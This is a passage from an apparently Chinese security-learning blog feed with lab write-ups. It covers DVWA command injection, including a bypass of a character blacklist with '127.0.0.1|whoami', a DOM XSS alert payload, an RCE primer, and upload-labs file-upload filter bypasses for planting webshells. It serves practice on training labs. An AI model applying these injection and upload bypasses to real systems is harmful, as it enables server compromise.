src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/dvwa/image-20231126135928349.png" alt="image-20231126135928349"></p><h3 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ]);<br><br>    <span class="hljs-comment">// Set blacklist</span><br>    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(  <span class="hljs-comment">//创建了一个关联行的数组，可以理解为cpp的map</span><br>        <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;| &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    );<br><br>    <span class="hljs-comment">// Remove any of the characters in the array (blacklist).</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-title function_ invoke__">array_keys</span>( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>疑问为什么使用了过滤<code>||</code>之后还是可以执行代码？</strong></p><blockquote><p>请注意这个替换的顺序，从上往下的替换，所以当执行到<code>|</code>的时候，就已经将输入的命令变成了<code>127.0.0.1|whoami</code></p></blockquote><p>如果<code>| </code>和<code>||</code>交换了位置</p><blockquote><p>请注意只有<code>|</code>的后面是有一个空格的，所以这个时候只要使用<code>127/0.0.1|whoami</code>就可以绕过去了</p></blockquote><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Split the IP into 4 octects</span><br>    <span class="hljs-variable">$octet</span> = <span class="hljs-title function_ invoke__">explode</span>( <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Check IF each octet is an integer</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">sizeof</span>( <span class="hljs-variable">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;<br>        <span class="hljs-comment">// If all 4 octets are int&#x27;s put the IP back together.</span><br>        <span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];<br><br>        <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>            <span class="hljs-comment">// Windows</span><br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// *nix</span><br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>        &#125;<br><br>        <span class="hljs-comment">// Feedback for the end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Ops. Let the user name theres a mistake</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h1><h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><p>直接插入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;asdf&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2>]]></content>
    
    
    
    <tags>
      
      <tag>靶场记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>远程代码执行</title>
    <link href="/2023/11/25/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/11/25/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>远程代码&#x2F;命令 执行又称为RCE，由于程序在调用一些函数的时候没有对用户的输入进行检测，所以造成了远程代码执行</p><p>但是本质就是利用了相对应的语言执行系统命令</p><p>rce 有两种解释</p><ul><li>remote code execute   远程代码执行</li><li>remote command execute   远程命令执行</li></ul><h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>根根原理就是利用了给用户提供了命令执行的方式，但是没有对内容做限制</p><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><ol><li><p>黑河挖掘</p><p>相对应的网站本身可以执行相对的命令  比如ip 等</p></li><li><p>白盒挖掘</p><p>反序列化漏洞  php  java go .net</p></li></ol><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><ol><li><p>执行PHP代码</p><p>获取服务器内容或相关信息</p></li><li><p>向服务器写WebShell</p><p>利用代码PHP代码功能，往服务器中写入shell脚本</p></li><li><p>控制服务器</p><p>利用shell脚本，上传大马，甚至控制服务器</p></li></ol><h1 id="Rce和Getshell"><a href="#Rce和Getshell" class="headerlink" title="Rce和Getshell"></a>Rce和Getshell</h1><p>在最开始的时候发现对这个有点懵，现在统一的解释一下</p><blockquote><p>RCE:</p><p>攻击者利用漏洞成功的在目标的系统上执行任意代码的能力。攻击者往往使用RCE获取目标系统的控制</p></blockquote><blockquote><p>Getshell:</p><p>简单明了的可以知道，就是攻击者得到了一个受攻击系统的shell</p></blockquote><p>总结的说：</p><p>Rce是攻击的技术，getshell是攻击成功的结果。攻击者可以通过各种方式实现RCE，而获得getshell是RCE的一种可能结果之一。</p><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><ol><li><p>通过代码审计</p><p>借助代码审计工具，非常方便的审计出此类的漏洞</p></li><li><p>一直的CMS漏洞</p><p>已知CMS有很多每年都会爆出来很多此类的漏洞</p></li><li><p>页面传参的检查</p><p>针对页面有传入参数的地方，可以重点关注传入恶意代码尝试，概率相对较小</p></li></ol><h1 id="常用的代码执行函数"><a href="#常用的代码执行函数" class="headerlink" title="常用的代码执行函数"></a>常用的代码执行函数</h1><blockquote><p>PHP: eval、assert、preg_replace()、+&#x2F;e模式（PHP版本&lt;5.5.0）</p><p>Javascript: eval</p><p>Vbscript：Execute、Eval</p><p>Python: exec</p><p>Java: Java中没有php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并</p><p>且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL等，这些都能造成代码执行漏洞。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>()<br><span class="hljs-title function_ invoke__">passthru</span>()<br><span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-title function_ invoke__">shell_exec</span>()<br><span class="hljs-title function_ invoke__">popen</span>()<br><span class="hljs-title function_ invoke__">proc_open</span>()<br><span class="hljs-title function_ invoke__">pcntl_exec</span>()<br><br></code></pre></td></tr></table></figure><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><blockquote><p>1.尽量不要使用危险函数</p><p>2.对数据进行黑白名单处理</p><p>3.对传入的特殊字符转义</p><p>4.谨慎使用preg-replace的e修饰符</p></blockquote><p>剩下的参考</p><p><a href="https://tsy244.github.io/2023/08/19/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/#web%E5%AE%89%E5%85%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">渗透基础 - chg (tsy244.github.io)</a></p><p><a href="https://tsy244.github.io/tags/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">Tags - 靶场刷题记录 - chg (tsy244.github.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>制作图片马</title>
    <link href="/2023/11/25/others/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/"/>
    <url>/2023/11/25/others/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="win"><a href="#win" class="headerlink" title="win"></a>win</h1><h2 id="使用cmd制作图片马"><a href="#使用cmd制作图片马" class="headerlink" title="使用cmd制作图片马"></a>使用cmd制作图片马</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/image-20231125154157109.png" alt="image-20231125154157109"></p><h2 id="使用010制作图片马"><a href="#使用010制作图片马" class="headerlink" title="使用010制作图片马"></a>使用010制作图片马</h2><p>直接添加到文件后面</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/image-20231125154409029.png" alt="image-20231125154409029"></p>]]></content>
    
    
    
    <tags>
      
      <tag>others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫入门</title>
    <link href="/2023/11/23/python%E7%88%AC%E8%99%AB/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/"/>
    <url>/2023/11/23/python%E7%88%AC%E8%99%AB/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="反爬机制"><a href="#反爬机制" class="headerlink" title="反爬机制"></a>反爬机制</h1><p>1. </p>]]></content>
    
    
    
    <tags>
      
      <tag>python爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs</title>
    <link href="/2023/11/22/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/upload-labs/"/>
    <url>/2023/11/22/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/upload-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="方法总结"><a href="#方法总结" class="headerlink" title="方法总结"></a>方法总结</h1><ol><li><p>尝试普通的php，查看会不会有提示</p></li><li><p>禁用前端js</p></li><li><p>尝试大小写绕过</p></li><li><p>尝试空格绕过</p></li><li><p>尝试修改Content-Type</p></li><li><p>php3,4,5</p></li><li><p>上传.htacess文件</p></li><li><p>添加空格绕过  </p><p>pass-07</p></li><li><p>最后添加一个点</p><p>pass08</p></li><li><p>双写绕过</p><p><code>.pphphp</code></p></li><li><p>熔断截取</p></li><li><p>测试多个后缀</p><p>比如apache 的解析漏洞，不认识rar就可以构造成为</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getshell<span class="hljs-selector-class">.php</span>.rar<br></code></pre></td></tr></table></figure></li></ol><h1 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h1><p><strong>0x00</strong></p><p>我先上传了一张正常的.png</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231122233521619.png" alt="image-20231122233521619"></p><p><strong>0x01</strong></p><p>尝试上传一个php,出现了这个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231122233604386.png" alt="image-20231122233604386"></p><p><strong>0x02</strong></p><p>尝试修改后缀绕过</p><p>也不行</p><p><strong>0x03</strong></p><p>检查源代码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231122235914606.png" alt="image-20231122235914606"></p><p>很明显的js前端验证，直接禁用，然后上传php</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123000101564.png" alt="image-20231123000101564"></p><p><strong>0x04</strong></p><p>docker逃逸</p><p><a href="https://zhuanlan.zhihu.com/p/614513965">宸极实验室—『杂项』Docker 逃逸方法汇总 - 知乎 (zhihu.com)</a></p><p><strong>0x05</strong></p><p>还有一种发现js前端验证的方法</p><p>当上传php的时候发现，使用bs抓包并没有数据包</p><h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><p><strong>0x00</strong></p><p>查看能上传什么文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123000548098.png" alt="image-20231123000548098"></p><p>这次没有提醒，但是bs有数据包，说明是都断验证</p><p><strong>0x01</strong></p><p>尝试修改文件类型  Content-Type</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123000909053.png" alt="image-20231123000909053"></p><p>发现这个上传成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123001019125.png" alt="image-20231123001019125"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123001054988.png" alt="image-20231123001054988"></p><h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><p><strong>0x00</strong></p><p>先上传一个shell看什么情况</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123001156404.png" alt="image-20231123001156404"></p><p><strong>0x01</strong></p><p>根据他的提示这个是黑名单</p><p>我们上传php5,php3之类的就能上传</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123010051867.png" alt="image-20231123010051867"></p><p>这道题会改变名字，连接的时候注意一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123010337749.png" alt="image-20231123010337749"></p><h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><p><strong>0x01</strong> 尝试上传php</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123161425891.png" alt="image-20231123161425891"></p><p>文件不允许上传</p><p>然后bs里也发现了包，说明不是前端限制</p><p><strong>0x02</strong> 尝试上传.htacess文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123162806870.png" alt="image-20231123162806870"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123162834849.png" alt="image-20231123162834849"></p><p>可以上传</p><p><strong>0x03</strong>上传图片马</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123163004227.png" alt="image-20231123163004227"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123163150430.png" alt="image-20231123163150430"></p><p>上传成功</p><p><strong>0x04</strong>连接shell</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123163225277.png" alt="image-20231123163225277"></p><h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><p><strong>0x01</strong> 普通的php已经上传不了了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123170107194.png" alt="image-20231123170107194"></p><p>可以尝试使用空格绕过</p><p><strong>0x02</strong>成功绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123170151670.png" alt="image-20231123170151670"></p><p><strong>0x03</strong></p><p>但是这里有一个大坑，注意空格绕过只针对win，所以这个上传完过后只能在win之下连接成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123173123028.png" alt="image-20231123173123028"></p><p>如果是使用docker搭建的，那么他的后缀会变成<code>.</code>之前的php也会消失</p><h1 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h1><p><strong>0x01</strong></p><p>这个是大小写绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123173457352.png" alt="image-20231123173457352"></p><h1 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h1><p><strong>0x01</strong></p><p>查看源码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123190337686.png" alt="image-20231123190337686"></p><p>发现没有首位去空</p><p><strong>0x02</strong></p><p>上传<code>.php </code>注意后面有一个空格</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123191238865.png" alt="image-20231123191238865"></p><p>上传成功</p><h1 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h1><p>0x01 查看源码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123194452461.png" alt="image-20231123194452461"></p><p>缺少去除<code>.</code></p><p><strong>0x02</strong></p><p>添加点</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123194707852.png" alt="image-20231123194707852"></p><p>上传成功</p><h1 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h1><p><strong>0x01</strong></p><p>还是源码分析</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123195738655.png" alt="image-20231123195738655"></p><p>发现没有对windows流特性进行处理</p><p><strong>0x02</strong></p><p>添加流</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123200038987.png" alt="image-20231123200038987"></p><p>然后发现使用带<code>::$data</code>的不能连接，所以，我们去掉后连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123200140606.png" alt="image-20231123200140606"></p><h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><p><strong>0x01</strong></p><p>使用<code>. . </code>绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123201157552.png" alt="image-20231123201157552"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231123201149235.png" alt="image-20231123201149235"></p><h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><p><strong>0x01</strong>\</p><p>我先上传了一个普通的getshell.php</p><p>发现上传成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231125145320168.png" alt="image-20231125145320168"></p><p><strong>0x02</strong></p><p>但是分析上传后，发现文件类型没了</p><p>尝试双写后最</p><p><img 